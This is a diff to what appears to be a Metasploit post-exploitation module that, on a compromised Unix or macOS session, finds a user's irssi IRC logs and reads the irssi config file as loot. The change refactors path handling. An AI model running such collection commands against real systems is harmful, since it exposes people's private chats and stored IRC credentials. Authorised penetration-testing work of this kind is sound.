@@ -38,9 +38,9 @@ class Metasploit3 < Msf::Post
       case session.platform
       
       when /unix|linux|bsd/
-        path = "/home/#{user}/irclogs/"
+        path = "/home/#{user}/"
       when /osx/
-        path = "/Users/#{user}/irclogs/"
+        path = "/Users/#{user}/"
       else
         print_error "Unsupported platform #{session.platform}"
         return
@@ -48,7 +48,7 @@ class Metasploit3 < Msf::Post
       
       get_logs(path)
       print_status "Attempting to gather config..."
-      get_config()  
+      get_config(path)  
       
       
   end
@@ -56,6 +56,7 @@ class Metasploit3 < Msf::Post
 
   
   def get_logs(path)
+    path = "#{path}irclogs/"
     logs = cmd_exec("find #{path} -name '*.log'")
     irc_logs = []
     logs.split("\n").each do |l|
@@ -70,8 +71,8 @@ class Metasploit3 < Msf::Post
     return irc_logs
   end
     
-  def get_config()
-    path = "/home/#{user}/.irssi/config"
+  def get_config(path)
+    path = "#{path}/.irssi/config"
     print_status("#{@peer} - Downloading config")
     content = cmd_exec("cat #{path}")
     loot = store_loot('IRSSI_CONFIG', 'text/plain', session, content, "#{@peer}_config", "IRSSI Config file")
